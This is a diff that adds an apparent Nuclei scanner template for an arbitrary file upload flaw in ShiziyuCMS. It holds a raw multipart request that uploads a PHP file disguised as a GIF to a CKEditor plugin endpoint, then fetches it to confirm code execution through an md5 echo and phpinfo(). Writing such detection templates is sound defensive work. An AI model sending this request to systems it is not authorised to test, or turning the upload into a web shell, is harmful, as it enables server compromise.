@@ -1,0 +1,58 @@
+id: shiziyucms-upload-rce
+
+info:
+  name: ShiziyuCMS Arbitrary File Upload RCE
+  author: ChiragArtani
+  severity: critical
+  description: |
+    A vulnerability in the CKEditor plugin of ShiziyuCMS allows for arbitrary file upload
+    through image_upload.php, leading to remote code execution.
+  reference:
+    - https://example.com
+  tags: shiziyucms,rce,upload,php
+
+http:
+  - raw:
+      - |-
+        POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryTesting123
+        Content-Length: 206
+
+        ------WebKitFormBoundaryTesting123
+        Content-Disposition: form-data; name="files"; filename="test.php"
+        Content-Type: image/gif
+
+        <?php echo md5('test123');phpinfo();?>
+        ------WebKitFormBoundaryTesting123--
+      - |
+        GET /Common/{{upload_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - '"result":"200"'
+          - 'image/uploads/'
+        condition: and
+
+      - type: word
+        part: body_2
+        words:
+          - "cc03e747a6afbbcbf8be7668acfebee5"  # MD5 hash of test123
+          - "phpinfo"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: upload_path
+        part: body_1
+        regex:
+          - 'image/uploads/[0-9]+\.php'
+        internal: true
